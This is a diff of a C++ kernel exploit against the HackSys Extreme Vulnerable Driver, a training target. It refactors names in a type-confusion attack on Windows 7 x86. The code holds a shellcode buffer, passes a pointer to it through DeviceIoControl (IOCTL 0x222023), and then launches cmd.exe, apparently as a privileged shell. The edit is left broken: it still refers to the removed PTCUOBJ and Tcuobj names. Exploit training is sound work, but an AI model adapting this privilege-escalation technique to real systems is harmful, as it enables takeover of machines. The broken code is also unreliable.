@@ -1,17 +1,9 @@
-// HEVD-TypeConfX86Win7.cpp : Defines the entry point for the console application.
-//
-
 #include "stdafx.h"
 #include <Windows.h>
 #include <stdio.h>
 #include <winioctl.h>
 #include <stdint.h>
 #include <malloc.h>
-
-typedef struct _TCUOBJ {
-	ULONG_PTR id;
-	ULONG_PTR Type;
-} TCUOBJ, *PTCUOBJ;
 
 int main()
 {
@@ -27,7 +19,7 @@ int main()
 		return 1;
 	}
 
-	DWORD outBytes = 0;
+	DWORD u = 0;
 
 	char pl[60] =
 		"\x60"
@@ -55,20 +47,25 @@ int main()
 	memcpy(pla, pl, sizeof(pl));
 	//LPVOID plAddress = &pla;
 	
-	PTCUOBJ Tcuobj = NULL;
-	Tcuobj = (PTCUOBJ)HeapAlloc(
+	typedef struct _OBJ {
+		ULONG_PTR id;
+		ULONG_PTR Type;
+	} OBJ, *POBJ;
+	
+	POBJ obj = NULL;
+	obj = (PTCUOBJ)HeapAlloc(
 		GetProcessHeap(),
 		HEAP_ZERO_MEMORY,
-		sizeof(TCUOBJ)
+		sizeof(OBJ)
 	);
 
-	Tcuobj->id = (ULONG_PTR)0x1;
-	Tcuobj->Type = (ULONG_PTR)pla;
+	obj->id = (ULONG_PTR)0x1;
+	obj->Type = (ULONG_PTR)pla;
 
 	DeviceIoControl(
 		dev, 0x222023,
-		(LPVOID)Tcuobj, sizeof(Tcuobj),
-		NULL, 0, &outBytes, (LPOVERLAPPED)NULL
+		(LPVOID)obj, sizeof(Tcuobj),
+		NULL, 0, &u, (LPOVERLAPPED)NULL
 	);
 	
 	system("cmd.exe");
